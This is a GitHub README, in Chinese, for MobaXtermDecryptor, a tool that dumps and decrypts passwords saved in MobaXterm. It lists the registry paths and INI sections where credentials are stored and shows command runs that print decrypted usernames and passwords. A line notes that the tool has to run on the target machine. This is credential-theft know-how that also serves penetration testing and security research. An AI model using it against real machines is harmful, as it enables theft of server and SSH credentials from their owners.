## MobaXtermDecryptor

[![Author](https://img.shields.io/badge/author-h0ny-red.svg "Author")](https://github.com/h0ny "Author")
[![Visitors](https://visitor-badge.laobi.icu/badge?page_id=h0ny.MobaXtermDecryptor "Visitors")](https://github.com/h0ny/MobaXtermDecryptor "Visitors")
[![Stars](https://img.shields.io/github/stars/h0ny/MobaXtermDecryptor.svg?style=flat "Stars")](https://github.com/h0ny/MobaXtermDecryptor "Stars")
![GitHub Downloads (all assets, all releases)](https://img.shields.io/github/downloads/h0ny/MobaXtermDecryptor/total?color=orange)
[![GitHub Release](https://img.shields.io/github/v/release/h0ny/MobaXtermDecryptor)](https://github.com/h0ny/MobaXtermDecryptor/releases)
![GitHub License](https://img.shields.io/github/license/h0ny/MobaXtermDecryptor)

### 介绍

一个简单的 MobaXterm 密码转储工具。

---

用户凭据存储的位置：

| Registry Path                     | Registry Entry         | MobaXterm.ini | Description              |
| --------------------------------- | ---------------------- | ------------- | ------------------------ |
| HKCU\Software\Mobatek\MobaXterm   | SessionP               | [Misc]        | Entropy (DPAPI)          |
| HKCU\Software\Mobatek\MobaXterm\M | UserName@MachineName   | [Sesspass]    | MasterPassword (base64)  |
| HKCU\Software\Mobatek\MobaXterm\P | [All Registry Entries] | [Passwords]   | Passwords (ciphertext)   |
| HKCU\Software\Mobatek\MobaXterm\C | [All Registry Entries] | [Credentials] | Credentials (ciphertext) |

部分 MobaXterm.ini 内容示例：

```ini
[Misc]
SessionP=656078197542
MPSetAccount=Administrator
MPSetComputer=WIN-KC7O8UA7U4Q

[Credentials]
dev-user=root:hDkUY2nK

[Passwords]
mobauser@mobaserver=hnp+7YZCxO75h1e/w1tST2IvKHtWIIIRuKQ=

[Sesspass]
Administrator@WIN-Demo=AQAAALK+kjnRao9Fp9ljPL2GpQIAAAAAAgAAAAAAEGYAAAABAAAgAAAA8eEio3ElndSDHvad+IUTeuDcxECIp6BRTcnl4WUO0hQAAAAADoAAAAACAAAgAAAApYkVRexqVUB0W2aggCLirnpVr7XXvG4zkThBB5Cc34RgAAAAtuRBDfbxi9Ws5Fp7D2DAV12a/7+ZAC4Y8s6LryB0AmG6eByh2+ScguKs0nKsXupoHtQrq1esdbOF+KA5ObYKv7e9Cmb3X86HX90sRyaqRoi0faQ4BwL2EVFP3CAqNfVCQAAAAOIiPQ/546VgLw5vn2ptgn/ELHzOiGWwA7v9ov3Z0/POZrPXW+1jtb2PeGCkWyH82PDjx5c0UyO4j7xw/UzrDYE=
```

### 使用方法

对于 MobaXterm 安装版本直接运行即可：

```
PS C:\> .\MobaXtermDecryptor.exe --debug
[14:48:54 INF] [+] Logger initialized with level: Debug
[14:48:54 INF] [+] Automatic mode
[14:48:55 DBG] [+] Searching for MobaXterm process:
[14:48:55 DBG] [+]   Process Name: MobaXterm, Version: 24.2
[14:48:55 DBG] [+]   Process ID: 2448, Path: C:\Program Files (x86)\Mobatek\MobaXterm\MobaXterm.exe
[14:48:55 DBG] [-] MobaXterm.ini configuration file does not exist: C:\Program Files (x86)\Mobatek\MobaXterm\MobaXterm.ini
[14:48:55 DBG] [+] Read information from the registry: HKEY_CURRENT_USER\Software\Mobatek\MobaXterm\
[14:48:55 INF] [+] MobaXterm Installer Edition
[14:48:55 INF] [+] MobaXterm Credentials:
[14:48:55 INF] [*]   Name:     dev-user
[14:48:55 INF] [*]   Username: root
[14:48:55 INF] [*]   Password: Admin123
[14:48:55 INF] [*]
[14:48:55 INF] [+] MobaXterm Passwords:
[14:48:55 INF] [*]   ConnName: mobauser@mobaserver
[14:48:55 INF] [*]   Password: 39214moba204877pass6472
[14:48:55 INF] [*]
```

对于 MobaXterm 便携版本需要指定 MobaXterm.ini 文件：

```
PS C:\> .\MobaXtermDecryptor.exe mobaxterm --debug c:\Users\Administrator\Documents\MobaXterm\MobaXterm.ini
[14:38:32 INF] [+] Logger initialized with level: Debug
[14:38:32 INF] [+] Execute mobaxterm command
[14:38:33 INF] [+] MobaXterm.ini configuration file path: c:\Users\hony\Documents\MobaXterm\MobaXterm.ini
[14:38:33 INF] [+] MobaXterm Portable Edition
[14:38:33 INF] [+] MobaXterm Credentials:
[14:38:33 INF] [*]   Name:     dev-user
[14:38:33 INF] [*]   Username: root
[14:38:33 INF] [*]   Password: Admin123
[14:38:33 INF] [*]
[14:38:33 INF] [+] MobaXterm Passwords:
[14:38:33 INF] [*]   ConnName: mobauser@mobaserver
[14:38:33 INF] [*]   Password: 100374moba240717pass345585
[14:38:33 INF] [*]
```

> 注意：对于便携版也需要在目标机器上运行，因为有进行 DPAPI 解密操作。

### 参考项目

- https://github.com/qwqdanchun/Pillager
- https://github.com/XMCyber/XMCredentialsDecryptor
- https://github.com/HyperSine/how-does-MobaXterm-encrypt-password
